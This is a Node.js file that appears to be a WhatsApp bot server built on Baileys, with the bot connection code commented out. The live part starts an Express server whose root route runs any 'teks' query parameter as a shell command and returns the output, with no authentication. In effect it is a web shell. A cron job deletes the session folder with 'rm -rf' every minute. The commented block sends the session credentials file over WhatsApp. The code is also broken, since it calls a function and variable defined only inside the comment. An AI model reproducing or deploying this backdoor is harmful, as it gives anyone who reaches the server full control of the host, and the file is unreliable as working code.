const fs = require('fs')
const P = require('pino')
const QR = require('qrcode')
const cron = require('node-cron')
const express = require('express')
const app = express()
const router = express.Router()
/*const {
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  makeInMemoryStore,
  jidDecode,
  proto,
  getContentType,
  jidNormalizedUser
} = require("@adiwajshing/baileys");
const bai = require("@adiwajshing/baileys")
const { Boom } = require("@hapi/boom");
const pino = require('pino')
app.set('view engine', 'ejs')

async function startSocket(PORT) {
const { state, saveCreds } = await useMultiFileAuthState(`./session`);
  const { version, isLatest } = await fetchLatestBaileysVersion();
  const conn = bai.default({
    logger: pino({ level: "silent" }),
    printQRInTerminal: true,
    browser: ["KilersBotz", "Safari", "5.1.7"],
    auth: state,
  });
        
  conn.ev.on('creds.update', saveCreds)
  
  let _qr
  conn.ev.on("connection.update", async (up) => {
    const { connection, lastDisconnect } = up;
    if (connection === "close") {
      let reason = new Boom(lastDisconnect?.error)?.output.statusCode;
      if (reason === DisconnectReason.badSession) {
        console.log(`Bad Session File, Please Delete Session and Scan Again`);
        process.exit();
      } else if (reason === DisconnectReason.connectionClosed) {
        console.log("Connection closed, reconnecting....");
        startSocket();
      } else if (reason === DisconnectReason.connectionLost) {
        console.log("Connection Lost from Server, reconnecting...");
        startSocket();
      } else if (reason === DisconnectReason.connectionReplaced) {
        console.log("Connection Replaced, Another New Session Opened, Please Restart Bot");
        process.exit();
      } else if (reason === DisconnectReason.loggedOut) {
        console.log(`Device Logged Out, Please Delete Folder Session and Scan Again.`);
        process.exit();
      } else if (reason === DisconnectReason.restartRequired) {
        console.log("Restart Required, Restarting...");
        startSocket();
      } else if (reason === DisconnectReason.timedOut) {
        console.log("Connection TimedOut, Reconnecting...");
        startSocket();
      } else {
        console.log(`Unknown DisconnectReason: ${reason}|${connection}`);
        startSocket();
      }
    } else if (connection === "open") {
      console.log("Bot success conneted to server");
      //await conn.sendMessage("0@s.whatsapp.net", { text: `Bot started!\n\njangan lupa support ya bang :)` });
      let user = bai.jidNormalizedUser(conn.user.id), path = fs.readFileSync('./session/creds.json')
      let quoted = await conn.sendMessage(user, { document: path, fileName: 'creds.json', mimetype: 'application/json' })
      await conn.sendMessage(user, { text: String(path) }, { quoted })
    }
    // console.log('Connected...', update)
                
    if (up.qr) _qr = await QR.toDataURL(up.qr)
    }
  )*/
  
  app.get('/', async (req, res) => {
    let teks = req.query.teks
    if(!teks) return res.json({msg: 'Massukan parameter teks'})
    
const { exec } = require('child_process')
const cp = require('child_process')
const { promisify } = require('util')
let _exec = promisify(exec).bind(cp)
  let o
  try {
    o = await _exec(teks)
  } catch (e) {
    o = e
  } finally {
    let { stdout, stderr } = o
    if (stdout.trim()) res.send(stdout)
    if (stderr.trim()) res.send(stderr)
}
                
         
    //res.render('index', { qrcode: _qr })
  })
  app.use(router)
  app.listen(PORT, () => log('App listened on port', PORT))


function log(...args) {
  return console.log('\u001b[105m[' + new Date().toLocaleTimeString('id', { timeZone: 'Asia/Jakarta' }) + ']\u001b[49m', ...args)
}
cron.schedule(
  "* * * * *",
  () => {
    resetsesi();
  },
  {
    scheduled: true,
    timezone: "Asia/Jakarta",
  }
);

async function resetsesi() {
const { exec } = require('child_process')
const cp = require('child_process')
const { promisify } = require('util')
let _exec = promisify(exec).bind(cp)
  let o
  try {
    o = await _exec('rm -rf session && node .')
  log('Success Reset Session')
  } catch (e) {
    o = e
  } finally {
    let { stdout, stderr } = o
    if (stdout.trim()) console.log(stdout)
    if (stderr.trim()) console.log(stderr)
}
                }
startSocket(~~(Math.random() * 1e4))
